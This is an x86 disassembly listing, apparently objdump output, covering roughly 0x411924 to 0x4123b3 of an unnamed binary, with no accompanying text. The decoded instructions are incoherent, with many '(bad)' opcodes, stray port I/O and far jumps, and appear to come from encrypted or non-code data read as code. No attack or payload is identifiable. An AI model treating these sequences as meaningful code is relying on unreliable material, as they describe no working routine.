  411924:	xor    ah,bl
  411926:	ret    
  411927:	iret   
  411928:	push   ebp
  411929:	iret   
  41192a:	add    ebx,DWORD PTR [edx+eax*2]
  41192d:	jle    0x4118be
  41192f:	test   al,0x62
  411931:	aas    
  411932:	mov    al,0xdb
  411934:	xor    DWORD PTR [edi],ebp
  411936:	(bad)
  41193a:	sbb    DWORD PTR [eax],ecx
  41193c:	xor    dl,BYTE PTR [ebp-0x47a90405]
  411942:	mov    cs,WORD PTR [edx]
  411944:	xor    dl,BYTE PTR [ebp-0x64b80461]
  41194a:	mov    ?,edx
  41194c:	xor    DWORD PTR [ebp-0x6d],esi
  41194f:	sti    
  411950:	fisub  WORD PTR [edx-0x6b1a1572]
  411956:	xchg   edi,eax
  411957:	xchg   esi,eax
  411958:	dec    esp
  411959:	out    0x18,al
  41195b:	shl    BYTE PTR [ecx],1
  41195d:	cmp    bh,ah
  41195f:	shl    BYTE PTR [edi+0x9bd3],cl
	...
  411989:	add    BYTE PTR [eax],al
  41198b:	add    ch,al
  41198d:	(bad)  
  41198e:	into   
  41198f:	mov    ss,esp
  411991:	sbb    al,0xf4
  411993:	add    edx,DWORD PTR [ecx-0x1a]
  411996:	retf   
  411997:	mov    gs,WORD PTR [eax]
  411999:	pop    edi
  41199a:	mov    edi,0xaf324442
  41199f:	cli    
  4119a0:	arpl   WORD PTR [esi-0x46bee430],sp
  4119a6:	sub    BYTE PTR [esp+ebp*8],al
  4119a9:	inc    edx
  4119aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119ab:	mov    esi,DWORD PTR ss:[ecx]
  4119ae:	cmp    BYTE PTR [esi+ecx*8],bl
  4119b1:	sbb    eax,0x5b040428
  4119b6:	out    0x9e,eax
  4119b8:	mov    cl,0xc2
  4119ba:	add    BYTE PTR [edx+0x19009c41],dh
  4119c0:	xchg   ebx,eax
  4119c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119c2:	or     BYTE PTR [ecx+0x55],dl
  4119c5:	mov    ah,0xfd
  4119c7:	pop    esi
  4119c8:	mov    bh,0xef
  4119ca:	push   ecx
  4119cb:	push   esi
  4119cc:	call   0x585f:0xa7dd7430
  4119d3:	inc    esi
  4119d4:	stos   BYTE PTR es:[edi],al
  4119d5:	shl    BYTE PTR fs:[ebp-0x30d346b0],0xe0
  4119dd:	pop    edx
  4119de:	push   eax
  4119df:	inc    ecx
  4119e0:	mov    ch,0x88
  4119e2:	std    
  4119e3:	es dec edi
  4119e5:	ret    
  4119e6:	mov    dl,0x2a
  4119e8:	pop    edi
  4119e9:	pop    ebx
  4119ea:	push   0xbf401fe9
  4119ef:	add    DWORD PTR [eax],0x0
	...
  411a19:	(bad)  
  411a1a:	mov    dh,0x3f
  411a1c:	jmp    0xf1b54a50
  411a21:	xchg   edi,eax
  411a22:	pop    es
  411a23:	jnp    0x411a1b
  411a25:	cdq    
  411a26:	cmp    BYTE PTR [eax-0x37ce6d66],cl
  411a2c:	stos   DWORD PTR es:[edi],eax
  411a2d:	fdiv   DWORD PTR [eax]
  411a2f:	push   ebp
  411a30:	jb     0x411aae
  411a32:	ffree  st(4)
  411a34:	aad    0x26
  411a36:	pop    ebx
  411a37:	push   0xd
  411a39:	xchg   ecx,eax
  411a3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a3b:	or     cl,dl
  411a3d:	push   ebp
  411a3e:	mov    al,ds:0x9737befd
  411a43:	cld    
  411a44:	inc    ebx
  411a45:	mov    dh,0x31
  411a47:	je     0x411a2a
  411a49:	xchg   eax,eax
  411a4b:	std    
  411a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a4d:	test   eax,0x2b9e21c2
  411a52:	arpl   ax,bp
  411a54:	setns  BYTE PTR [ecx]
  411a57:	inc    BYTE PTR [ebx]
  411a59:	mov    WORD PTR [ecx],?
  411a5b:	je     0x411a5d
  411a5d:	ins    DWORD PTR es:[edi],dx
  411a5e:	aam    0x59
  411a60:	push   edx
  411a62:	(bad)  
  411a64:	jne    0x411a57
  411a66:	fnsave [eax+ecx*1-0x63]
  411a6a:	sbb    BYTE PTR [esi-0x1],cl
  411a6d:	ret    0xbff3
  411a70:	add    al,0x45
  411a72:	imul   ecx,DWORD PTR [ecx+0xc47f2ec],0xfd65c5e8
  411a7c:	inc    DWORD PTR [eax]
	...
  411aa6:	cs sbb al,0x72
  411aa9:	and    al,0x4d
  411aab:	push   0x66
  411aad:	inc    ecx
  411aae:	xor    eax,0x8a1ce86c
  411ab3:	(bad)  
  411ab5:	push   eax
  411ab6:	lods   eax,DWORD PTR ds:[esi]
  411ab7:	pop    ebx
  411ab8:	add    bh,ch
  411aba:	jae    0x411b0b
  411abc:	arpl   WORD PTR [esi-0x4c],sp
  411abf:	pop    ebx
  411ac0:	push   eax
  411ac1:	jmp    FWORD PTR [eax-0x5ef819cd]
  411ac7:	fdivp  st(6),st
  411ac9:	call   0x3e85a3
  411ace:	cmp    al,0x1d
  411ad0:	push   es
  411ad1:	add    BYTE PTR [eax-0x767c164e],cl
  411ad7:	fbld   TBYTE PTR [edi+0x0]
  411ada:	outs   dx,DWORD PTR ds:[esi]
  411adb:	and    bh,bh
  411add:	jne    0x411a9c
  411adf:	shr    DWORD PTR [edi],cl
  411ae1:	push   eax
  411ae2:	rcr    dh,cl
  411ae4:	mov    BYTE PTR [ebp-0x1f],al
  411ae7:	push   ecx
  411ae8:	sbb    bh,bh
  411aea:	call   0x72ec011d
  411aef:	fdivp  st(6),st
  411af1:	push   0x16
  411af3:	fidiv  WORD PTR [eax+ecx*1-0x53]
  411af7:	mov    ebx,0x51b2fffe
  411afc:	sbb    al,0xff
  411afe:	sbb    al,0x4f
  411b00:	cld    
  411b01:	out    0xaa,eax
  411b03:	loopne 0x411a91
  411b05:	(bad)  
  411b06:	jnp    0x411b36
  411b08:	mov    ?,esi
	...
  411b32:	add    cl,ch
  411b34:	sub    DWORD PTR [edx-0x735733b5],ebx
  411b3a:	enter  0x355e,0x2
  411b3e:	push   ebp
  411b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b40:	test   DWORD PTR [eax+0x17e854c3],eax
  411b46:	add    BYTE PTR [esi+0x14748b47],dh
  411b4c:	call   0x447a:0x983b4e9c
  411b53:	xor    BYTE PTR [esi+ecx*8+0x202d464],ch
  411b5a:	and    bl,0x41
  411b5d:	push   ss
  411b5e:	inc    edi
  411b5f:	test   bh,al
  411b61:	and    eax,DWORD PTR [ecx+0x1c]
  411b64:	in     eax,0x99
  411b66:	adc    DWORD PTR [ebx+0x44],ecx
  411b69:	add    cl,BYTE PTR [ebx]
  411b6b:	fmul   st(0),st
  411b6d:	xlat   BYTE PTR ds:[ebx]
  411b6e:	push   esi
  411b6f:	add    al,0xdf
  411b71:	sub    eax,0xc229f3ff
  411b76:	jae    0x411bb4
  411b78:	mov    ebx,0x4474f846
  411b7d:	add    ch,bh
  411b7f:	call   0x8b44:0x5d66128c
  411b86:	je     0x411b4c
  411b88:	add    eax,0x9ab40810
  411b8d:	or     eax,0x1015bbff
  411b92:	clc    
  411b93:	les    esi,FWORD PTR [esi+esi*1-0x1]
	...
  411bbf:	add    BYTE PTR [ebx+0x65bfd5e8],ch
  411bc5:	std    
  411bc6:	mov    esi,edi
  411bc8:	fwait
  411bc9:	pop    ebx
  411bca:	cdq    
  411bcb:	pop    edx
  411bcc:	dec    ebx
  411bcd:	push   esi
  411bce:	adc    al,0x4d
  411bd0:	mov    ch,BYTE PTR [eax+0x63088b93]
  411bd6:	jg     0x411b89
  411bd8:	jmp    0xe419:0x652b872d
  411bdf:	add    edx,ecx
  411be1:	loope  0x411b66
  411be3:	xchg   DWORD PTR [edi+0x37],ebx
  411be6:	pop    ss
  411be7:	push   ds
  411be8:	sbb    al,0xc1
  411bea:	es mov ecx,eax
  411bed:	bound  ecx,QWORD PTR [edi+0x13]
  411bf0:	fld    TBYTE PTR ds:0x2ed87d57
  411bf6:	arpl   cx,cx
  411bf8:	shl    BYTE PTR [edx+0x6e9c03a8],0xe7
  411bff:	pavgw  mm0,mm2
  411c02:	mov    dl,0x21
  411c04:	fstp   QWORD PTR [edx-0x6a]
  411c07:	fwait
  411c08:	mov    ch,0x6c
  411c0a:	out    0x3,eax
  411c0c:	daa    
  411c0d:	sbb    edx,DWORD PTR [ebp+ebx*8+0x2f064372]
  411c14:	add    ebp,DWORD PTR [esi]
  411c16:	jecxz  0x411bdb
  411c18:	outs   dx,DWORD PTR ds:[esi]
  411c19:	jnp    0x411c8b
  411c1b:	inc    ecx
  411c1c:	hlt    
  411c1d:	ret    0x3e7
  411c20:	sti    
  411c21:	in     al,dx
  411c22:	jg     0x411ca3
	...
  411c4c:	add    BYTE PTR [ecx-0x64],bh
  411c4f:	out    0x8a,eax
  411c51:	push   eax
  411c52:	xor    esp,edi
  411c54:	adc    BYTE PTR [ebx+eax*2],ah
  411c57:	fimul  DWORD PTR ds:0x10d72dcb
  411c5d:	les    eax,FWORD PTR [edx-0x30]
  411c60:	xor    al,0xbb
  411c62:	sub    eax,0xf373d6c4
  411c67:	mov    esi,0x12daa8a
  411c6c:	mov    ebx,0x34056645
  411c71:	jmp    0xb72a1d2b
  411c76:	out    dx,eax
  411c77:	push   0x9c3d65
  411c7c:	add    DWORD PTR [ebp-0x5916c049],esi
  411c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c83:	or     BYTE PTR [ecx+0x7efdb06f],dl
  411c89:	or     DWORD PTR [ebx+0x68],ebx
  411c8c:	fs cmp eax,0xe801009c
  411c92:	mov    bh,0x3f
  411c94:	jmp    0xb220833f
  411c99:	loopne 0x411cf5
  411c9b:	call   0xfe6f0fdd
  411ca0:	pusha  
  411ca1:	fdivr  QWORD PTR [esi]
  411ca3:	imul   ebp,ecx,0x17
  411ca6:	shl    DWORD PTR [esi-0x58],1
  411ca9:	pop    ds
  411caa:	ret    
  411cab:	mov    eax,0xfd5ad8cf
  411cb0:	hlt    
	...
  411cd9:	add    al,al
  411cdb:	xchg   esp,eax
  411cdc:	aas    
  411cdd:	jmp    0x1e960f99
  411ce2:	xchg   esi,eax
  411ce3:	jecxz  0x411d28
  411ce5:	sbb    eax,0x47685b21
  411cea:	cmp    eax,0x6791009a
  411cef:	mov    dh,0x3f
  411cf1:	jmp    0xa220848c
  411cf6:	pop    eax
  411cf7:	pop    ebx
  411cf8:	call   0xfe6d2846
  411cfd:	jo     0x411d12
  411cff:	sub    ecx,DWORD PTR [esp-0x79976384]
  411d06:	(bad)  
  411d07:	cdq    
  411d08:	add    BYTE PTR [ecx+0x68],al
  411d0b:	mov    dh,0x3f
  411d0d:	add    ch,al
  411d0f:	jecxz  0x411d45
  411d11:	loope  0x411d00
  411d13:	xchg   edi,eax
  411d14:	add    al,ch
  411d16:	xor    DWORD PTR [ebx-0x3],ebp
  411d19:	(bad)  
  411d1a:	cld    
  411d1b:	imul   ebp,eax,0xffffff83
  411d1e:	cmp    bl,cl
  411d20:	std    
  411d21:	jae    0x411d70
  411d23:	(bad)  
  411d24:	jl     0x411d16
  411d26:	jne    0x411d84
  411d28:	inc    edx
  411d29:	sub    DWORD PTR [eax],0xffffffd3
  411d2c:	std    
  411d2d:	jae    0x411d88
  411d2f:	push   eax
  411d30:	(bad)  
  411d31:	call   FWORD PTR [edx+0x7d75fea1]
  411d37:	sar    dl,1
  411d39:	dec    ebp
  411d3a:	retf   0xfee1
  411d3d:	jne    0x411d3f
	...
  411d67:	icebp  
  411d68:	loope  0x411dde
  411d6a:	or     ch,ch
  411d6c:	fs dec esi
  411d6e:	(bad)  
  411d6f:	jmp    0x85b:0xeaf074e1
  411d76:	call   0x3e8ffd
  411d7b:	jmp    0xe630:0x60ffec5b
  411d82:	cmp    al,0xbb
  411d84:	loop   0x411d84
  411d86:	push   DWORD PTR [eax+0x2d75fecb]
  411d8c:	loop   0x411e02
  411d8e:	or     BYTE PTR ds:0x2aff4e55,bl
  411d94:	loop   0x411e0a
  411d96:	in     al,dx
  411d97:	or     eax,0xeaff5126
  411d9c:	loop   0x411e12
  411d9e:	hlt    
  411d9f:	sbb    eax,0xcaff512e
  411da4:	loop   0x411e1a
  411da6:	lock in eax,dx
  411da8:	push   esi
  411da9:	dec    edi
  411daa:	(bad)  
  411dab:	jmp    0x8d1a:0x1ce874e2
  411db2:	dec    edi
  411db3:	mov    ebx,0xb074891c
  411db8:	adc    al,0xf
  411dba:	or     BYTE PTR [ebx+ebx*4+0x44a3ff3a],dh
  411dc1:	mov    ecx,0x2f4220c1
  411dc6:	mov    eax,DWORD PTR [eax+0xfbbdc0]
	...
  411df4:	test   BYTE PTR [ecx+0x1c],0x40
  411df8:	or     DWORD PTR [esi-0x4],0xffffffe7
  411dfc:	or     eax,0xa5fe874c
  411e01:	jle    0x411d8b
  411e03:	imul   ebx,DWORD PTR [eax+ecx*2],0x5b706804
  411e0a:	inc    ecx
  411e0b:	add    ah,al
  411e0d:	inc    ecx
  411e0e:	add    al,BYTE PTR [eax]
  411e10:	pushf  
  411e11:	mov    DWORD PTR [edx+edx*2-0x400373b5],ebp
  411e18:	enter  0x3460,0xe8
  411e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e1d:	out    0x88,eax
  411e1f:	(bad)  
  411e20:	daa    
  411e21:	or     BYTE PTR ds:0x209cc19,0x0
  411e28:	xor    esp,DWORD PTR [ebx-0xc7d18e7]
  411e2e:	add    DWORD PTR [eax+0x13],edx
  411e31:	enter  0xe7f9,0xaf
  411e35:	sti    
  411e36:	mov    dh,bh
  411e38:	hlt    
  411e39:	mov    al,0x31
  411e3b:	(bad)  
  411e3c:	sti    
  411e3d:	pop    ecx
  411e3e:	push   cs
  411e3f:	cld    
  411e40:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e42:	stc    
  411e43:	out    0x1b,eax
  411e45:	cli    
  411e46:	mov    dh,bh
  411e48:	aad    0x76
  411e4a:	std    
  411e4b:	push   DWORD PTR [eax-0x43]
  411e4e:	xchg   ebp,eax
  411e4f:	sbb    al,0x5b
  411e52:	jecxz  0x411e83
  411e54:	ss pop ebx
  411e56:	push   ecx
  411e57:	inc    ebp
	...
  411e80:	add    bl,al
  411e82:	mov    al,0xdf
  411e84:	fwait
  411e85:	ins    DWORD PTR es:[edi],dx
  411e86:	cwde   
  411e87:	into   
  411e88:	xchg   DWORD PTR [eax+eiz*4-0x4017843d],esp
  411e8f:	das    
  411e90:	inc    ebp
  411e91:	sbb    al,0xdb
  411e93:	test   BYTE PTR [ebx],0x10
  411e96:	fwait
  411e97:	aas    
  411e98:	cli    
  411e99:	cli    
  411e9a:	fwait
  411e9b:	out    0x2e,eax
  411e9d:	je     0x411eaf
  411e9f:	fadd   QWORD PTR [ebx]
  411ea1:	sbb    al,0x56
  411ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ea4:	adc    BYTE PTR [edi],bh
  411ea6:	xchg   edx,eax
  411ea7:	jg     0x411e86
  411ea9:	aad    0x29
  411eab:	xchg   ebx,edi
  411ead:	stos   DWORD PTR es:[edi],eax
  411eae:	scas   eax,DWORD PTR es:[edi]
  411eaf:	loopne 0x411ee4
  411eb1:	hlt    
  411eb2:	pop    edx
  411eb3:	out    0x96,eax
  411eb5:	cdq    
  411eb6:	mov    bl,0xd7
  411eb8:	push   ds
  411eb9:	fstp   QWORD PTR [edx-0x49]
  411ebc:	xchg   al,dl
  411ebe:	push   edx
  411ebf:	dec    edi
  411ec0:	aad    0xc4
  411ec2:	sub    DWORD PTR [edi-0x64],edx
  411ec5:	cmc    
  411ec6:	mov    cl,BYTE PTR [esi-0x79]
  411ec9:	aaa    
  411eca:	outs   dx,BYTE PTR ds:[esi]
  411ecb:	daa    
  411ecc:	dec    ebp
  411ecd:	sub    ch,BYTE PTR [edx]
  411ecf:	aas    
  411ed0:	xchg   DWORD PTR ds:0x90feeff9,ebp
  411ed6:	sbb    ebp,DWORD PTR [edi]
  411ed8:	adc    DWORD PTR [eax],edx
  411eda:	sub    bl,BYTE PTR [ebp-0x5335fc05]
  411ee0:	xchg   BYTE PTR [edx],al
  411ee2:	mov    ah,BYTE PTR [eax]
  411ee4:	ret    0x0
	...
  411f0b:	add    BYTE PTR [eax],al
  411f0d:	add    BYTE PTR [edi],bl
  411f0f:	pop    ebx
  411f10:	mov    ah,0x7a
  411f12:	pop    es
  411f13:	fisubr WORD PTR [ebx]
  411f15:	mov    BYTE PTR [edx-0x4b],dl
  411f18:	out    0x19,eax
  411f1a:	pop    esi
  411f1b:	sub    al,BYTE PTR [ecx]
  411f1d:	jl     0x411ef6
  411f1f:	inc    ecx
  411f20:	inc    eax
  411f21:	pushf  
  411f22:	call   0x3bd4:0x942c8828
  411f29:	inc    esp
  411f2a:	add    BYTE PTR [eax+eax*1+0x7229e269],bl
  411f31:	sub    DWORD PTR [eax],edx
  411f33:	jnp    0x411f9a
  411f35:	sub    BYTE PTR [eax],ah
  411f37:	xchg   edx,eax
  411f38:	call   0xfe6af382
  411f3d:	loop   0x411f9e
  411f3f:	lods   eax,DWORD PTR ds:[esi]
  411f40:	and    DWORD PTR [esi],edx
  411f42:	mov    al,0xf1
  411f44:	push   edi
  411f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f46:	mov    ds:0x7115c054,al
  411f4b:	cdq    
  411f4c:	push   0xbf3a1fe9
  411f51:	add    DWORD PTR [ebx-0x40],edx
  411f54:	aas    
  411f55:	jmp    0xf1b54989
  411f5a:	xchg   ecx,ebp
  411f5c:	js     0x411fd4
  411f5e:	mov    ds:0x9b1ec841,al
  411f63:	sub    ch,bh
  411f65:	sbb    ah,BYTE PTR [eax-0x1e]
  411f68:	std    
  411f69:	pop    esi
  411f6a:	call   0x7360:0x6787f328
  411f71:	sub    DWORD PTR [eax],eax
	...
  411f9b:	adc    eax,0xfbf5e87e
  411fa0:	sub    esi,edi
  411fa2:	repnz pop edi
  411fa4:	lods   eax,DWORD PTR ds:[esi]
  411fa5:	and    al,0xc1
  411fa7:	lock sar DWORD PTR [edi],0xe9
  411fab:	dec    edi
  411fac:	xor    ebx,DWORD PTR [ecx+0x5129a2ba]
  411fb2:	xchg   ecx,eax
  411fb3:	pop    ds
  411fb4:	pop    ebx
  411fb5:	in     eax,dx
  411fb6:	push   edi
  411fb7:	pop    ss
  411fb8:	and    BYTE PTR [ebp-0x58],0x1f
  411fbc:	mov    edi,ebp
  411fbe:	add    BYTE PTR [eax+0x24],ch
  411fc1:	out    0x83,al
  411fc3:	popf   
  411fc4:	loope  0x411fc4
  411fc6:	call   0x3e910c
  411fcb:	lahf   
  411fcc:	cmp    eax,0xde06dde6
  411fd1:	dec    BYTE PTR [ebx]
  411fd3:	jne    0x412020
  411fd5:	and    al,0x68
  411fd7:	or     al,0x46
  411fd9:	aas    
  411fda:	add    ch,dh
  411fdc:	(bad)  
  411fdd:	push   0x4ddee253
  411fe2:	push   0xbeed5cb5
  411fe7:	fld    QWORD PTR ds:0x6c854167
  411fed:	std    
  411fee:	jne    0x411f7d
  411ff0:	les    edx,FWORD PTR [ecx+0x78]
  411ff3:	mov    ds:0x425de5de,al
  411ff8:	fdivp  st(6),st
  411ffa:	dec    DWORD PTR [eax]
  411ffc:	sar    esi,cl
  411ffe:	jne    0x412000
	...
  412028:	ins    DWORD PTR es:[edi],dx
  412029:	(bad)  
  41202a:	int    0x4c
  41202c:	loop   0x41200b
  41202e:	pop    esi
  41202f:	leave  
  412030:	xchg   DWORD PTR [ebx+0x0],ebx
  412033:	push   ebp
  412034:	mov    esi,0xe5c482c2
  412039:	scas   eax,DWORD PTR es:[edi]
  41203a:	inc    esp
  41203b:	lock test edi,ebx
  41203e:	je     0x41204c
  412040:	(bad)  
  412042:	push   ecx
  412043:	jmp    edx
  412045:	and    DWORD PTR [esi+0x7cdb2774],edi
  41204b:	cld    
  41204c:	aaa    
  41204d:	push   esi
  41204e:	and    DWORD PTR [ebx-0x7e9c2c38],ecx
  412054:	or     eax,0x1c752010
  412059:	fidiv  WORD PTR [eax+edx*1+0x22]
  41205d:	pop    eax
  41205e:	or     al,ch
  412060:	sbb    al,0x7f
  412062:	aaa    
  412063:	push   ebx
  412065:	pop    eax
  412066:	or     eax,0x89a6ebfc
  41206b:	(bad)  
  41206c:	imul   ebp,DWORD PTR [edx],0x3167f49a
  412072:	test   DWORD PTR [ecx+ebx*2+0x9e83222],ecx
  412079:	addr16 cmp esi,0xffffffd5
  41207d:	repz cmc 
  41207f:	call   DWORD PTR [eax-0x43]
  412082:	xchg   ebp,eax
  412083:	sbb    al,0x9
  412086:	sbb    BYTE PTR [eax],al
  412088:	ss jne 0x41200e
  41208b:	je     0x41208d
	...
  4120b5:	adc    al,0xa
  4120b7:	fisttp QWORD PTR [ebx-0x65]
  4120ba:	lock jp 0x412101
  4120bd:	nop
  4120be:	fwait
  4120bf:	add    al,0x6a
  4120c1:	sbb    al,0x4a
  4120c3:	cmp    esp,DWORD PTR [edi-0x23]
  4120c6:	xor    DWORD PTR [edx],ebx
  4120c8:	add    bl,BYTE PTR [edx+esi*1]
  4120cb:	and    bh,0x6d
  4120ce:	bound  eax,QWORD PTR [ebx+0xdf217fe]
  4120d4:	aas    
  4120d5:	xchg   ebp,eax
  4120d6:	jle    0x412064
  4120d8:	scas   eax,DWORD PTR es:[di]
  4120da:	pop    eax
  4120db:	inc    ecx
  4120dc:	add    BYTE PTR [ebx+0x2e],dl
  4120df:	mov    ah,bh
  4120e1:	add    eax,0x1700047d
  4120e6:	jb     0x4120f5
  4120e8:	and    edi,DWORD PTR [ebx]
  4120ea:	push   es
  4120eb:	mov    ah,bh
  4120ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120ee:	jmp    0xa0e1f77
  4120f3:	xor    ecx,ecx
  4120f5:	fdiv   QWORD PTR [ecx]
  4120f7:	sbb    al,BYTE PTR [eax]
  4120f9:	sbb    al,0x9d
  4120fb:	inc    ebx
  4120fc:	imul   ebx,DWORD PTR [esp+eax*8],0x5b147484
  412103:	setns  BYTE PTR [eax-0x6664e0da]
  41210a:	xchg   ebp,eax
  41210b:	push   ss
  41210c:	test   dl,dh
  41210e:	mov    al,0xf
  412110:	fwait
  412111:	xchg   ecx,eax
  412112:	xchg   ebp,eax
  412113:	push   es
  412114:	test   dl,ah
  412116:	mov    al,0xfb
  412118:	add    DWORD PTR [eax],0x0
	...
  41213f:	add    BYTE PTR [eax],al
  412141:	add    BYTE PTR [eax+0x53],dl
  412144:	(bad)  
  412145:	stc    
  412146:	addr16 es out dx,eax
  412149:	mov    ecx,0xd8e75fdd
  41214e:	xchg   esi,eax
  41214f:	aaa    
  412150:	imul   ecx,DWORD PTR [eax-0x49],0xffffffb1
  412154:	out    0xed,eax
  412156:	pop    edi
  412157:	es push ebp
  412159:	or     al,0xb4
  41215b:	clc    
  41215c:	xor    al,BYTE PTR [ebx-0x7fdb2b5e]
  412162:	add    ebx,DWORD PTR [ebx-0x19]
  412165:	jb     0x412138
  412167:	mov    bl,0x85
  412169:	jmp    0x412147
  41216b:	pop    edx
  41216c:	setg   dl
  41216f:	fwait
  412170:	out    0x82,eax
  412172:	lock push edx
  412174:	jg     0x412112
  412176:	jmp    0x8726:0xf0838f25
  41217d:	stc    
  41217e:	sbb    esi,DWORD PTR [ebx]
  412180:	scas   al,BYTE PTR es:[edi]
  412181:	iret   
  412182:	pop    edx
  412183:	mov    eax,es:0x145b1f46
  412189:	(bad)  
  41218a:	aaa    
  41218b:	fisubr DWORD PTR [ebx]
  41218d:	jl     0x41214a
  41218f:	pop    edx
  412190:	out    0x72,eax
  412192:	jns    0x4121ba
  412194:	fisttp QWORD PTR [ebx]
  412196:	inc    esp
  412197:	xor    DWORD PTR [edx-0x42d9d57e],esp
  41219d:	mov    db6,eax
  4121a0:	out    dx,eax
  4121a1:	imul   ebx,DWORD PTR [edx+edx*4+0x0],0x36
	...
  4121ce:	add    BYTE PTR [edi-0x61268bdc],bl
  4121d4:	scas   al,BYTE PTR es:[edi]
  4121d5:	or     BYTE PTR [ecx],dl
  4121d7:	inc    esi
  4121d8:	xchg   edx,eax
  4121d9:	std    
  4121da:	push   ds
  4121db:	lahf   
  4121dc:	scas   al,BYTE PTR es:[edi]
  4121dd:	sbb    BYTE PTR [esi],dl
  4121df:	cmc    
  4121e0:	dec    ecx
  4121e1:	std    
  4121e2:	xchg   esp,eax
  4121e3:	pop    ss
  4121e4:	xor    edi,ebp
  4121e6:	mov    bl,0x9e
  4121e8:	and    al,0x69
  4121ea:	add    al,0xc7
  4121ec:	call   0x6de8:0x55d4f600
  4121f3:	or     DWORD PTR [ebx+0x0],ebx
  4121f6:	repnz pop edi
  4121f8:	scas   eax,DWORD PTR es:[edi]
  4121f9:	arpl   WORD PTR [ecx+0x47],dx
  4121fc:	mov    ebp,0x1647e93f
  412201:	cmp    ecx,ebp
  412203:	pop    ds
  412204:	aam    0x43
  412206:	shl    DWORD PTR [edi+0x2028663c],0x26
  41220d:	je     0x4121e8
  41220f:	pop    es
  412210:	mov    BYTE PTR [edx],bh
  412212:	jmp    0x1e017436
  412217:	push   ss
  412218:	pop    edx
  412219:	inc    ebx
  41221a:	mov    eax,ds:0x96109ea8
  41221f:	je     0x412276
  412221:	call   0xfe659cf4
  412226:	push   0xffffffe7
  412228:	and    al,0x75
  41222a:	mov    ch,0xa8
  41222c:	sahf   
  41222d:	cld    
  41222e:	add    DWORD PTR [ecx],ebx
  412230:	pop    ebx
  412231:	in     eax,dx
  412232:	das    
	...
  41225b:	add    BYTE PTR [esi+0x4b5108ae],bl
  412261:	xchg   ebx,eax
  412262:	std    
  412263:	pop    esi
  412264:	sahf   
  412265:	scas   al,BYTE PTR es:[edi]
  412266:	or     al,0x56
  412268:	xor    al,0x5d
  41226a:	call   0xfe657b91
  41226f:	add    dl,bl
  412271:	and    bh,dl
  412273:	call   eax
  412275:	push   eax
  412276:	call   0xff1ae1d9
  41227b:	call   eax
  41227d:	inc    eax
  41227e:	std    
  41227f:	jne    0x412282
  412281:	fidiv  DWORD PTR [eax+ecx*1+0xd]
  412285:	rol    BYTE PTR [edi-0x1],cl
  412288:	or     dl,BYTE PTR [edi+0x3f514bf]
  41228e:	mov    ebp,esp
  412290:	jbe    0x41222e
  412292:	cmc    
  412293:	push   esi
  412294:	inc    esi
  412295:	fwait
  412296:	test   DWORD PTR [ebx-0x7c],ecx
  412299:	pop    eax
  41229a:	add    BYTE PTR [ecx+edi*1-0x23],dh
  41229e:	cmp    al,0x83
  4122a0:	push   cs
  4122a1:	sbb    dh,bh
  4122a3:	call   DWORD PTR [ecx+0x2e]
  4122a6:	cmp    DWORD PTR ds:0x41168e,0xffffffb5
  4122ad:	sub    al,0x68
  4122af:	(bad)  
  4122b0:	lock (bad) 
  4122b3:	inc    DWORD PTR [ebp-0x32ba3aa8]
  4122b9:	pop    edi
  4122ba:	add    BYTE PTR [eax],al
  4122bc:	jne    0x412293
  4122be:	inc    esp
  4122bf:	cld    
	...
  4122e8:	add    BYTE PTR [ebp-0x2c],al
  4122eb:	inc    esp
  4122ec:	clc    
  4122ed:	xor    eax,0xd567fe35
  4122f2:	xor    DWORD PTR [ecx+0x0],eax
  4122f5:	call   0x95f:0x344b814c
  4122fc:	rcl    BYTE PTR [ecx+0x1f],0x83
  412300:	jge    0x4122cf
  412302:	pop    esi
  412303:	je     0x412342
  412305:	mov    dh,0x23
  412307:	cli    
  412308:	add    BYTE PTR [ecx+0x63],ah
  41230b:	mov    DWORD PTR [ebp-0x27],esi
  41230e:	mov    ch,0x1b
  412310:	push   esi
  412311:	sbb    al,0xb9
  412313:	cmp    bh,bh
  412315:	mov    dl,0x29
  412317:	xor    DWORD PTR [ebp+0x0],0x1b07fa9d
  41231e:	in     al,dx
  41231f:	xor    edi,edi
  412321:	mov    DWORD PTR [edx],edi
  412323:	push   0xffffffdd
  412325:	or     dh,BYTE PTR [ebp+0x7f]
  412328:	pop    ebp
  412329:	add    ebp,edi
  41232b:	jns    0x4122af
  41232d:	loop   0x41236c
  41232f:	test   DWORD PTR [esp+esi*8+0x31],edi
  412333:	test   BYTE PTR [edi+ebx*4],0x13
  412337:	add    dh,BYTE PTR [ebp-0x35]
  41233a:	pop    esp
  41233b:	cmc    
  41233c:	sti    
  41233d:	fisttp DWORD PTR [esi]
  41233f:	mov    DWORD PTR [edx+0x5d],ecx
  412342:	xor    ah,al
  412344:	enter  0x3dde,0x2
  412348:	push   ebp
  412349:	xchg   edi,eax
  41234a:	or     eax,0xc385
	...
  412373:	add    BYTE PTR [eax],al
  412375:	add    BYTE PTR [eax-0x4bbbb8a0],dh
  41237b:	xor    DWORD PTR [edx],eax
  41237d:	add    BYTE PTR [edi*8+0x321cf3c6],bl
  412384:	add    al,BYTE PTR [eax]
  412386:	fwait
  412387:	outs   dx,BYTE PTR ds:[esi]
  412388:	adc    al,0x8f
  41238a:	fldln2 
  41238c:	push   edx
  41238d:	ins    BYTE PTR es:[edi],dx
  41238e:	mov    BYTE PTR [edi+0x481c6a04],dl
  412394:	add    al,0x6a
  412396:	sbb    al,0xc5
  412398:	idiv   bl
  41239a:	jae    0x4123e2
  41239c:	adc    BYTE PTR [edx+0x1c],ch
  41239f:	pop    eax
  4123a0:	add    al,0xe8
  4123a2:	add    DWORD PTR [edx],ebx
  4123a4:	add    al,BYTE PTR [eax]
  4123a6:	daa    
  4123a7:	repnz cmc 
  4123a9:	xor    al,0xec
  4123ab:	inc    ecx
  4123ac:	ins    BYTE PTR es:[edi],dx
  4123ad:	loopne 0x412387
  4123af:	mov    ah,0x80
  4123b1:	mov    cl,bl
  4123b3:	pop    edx
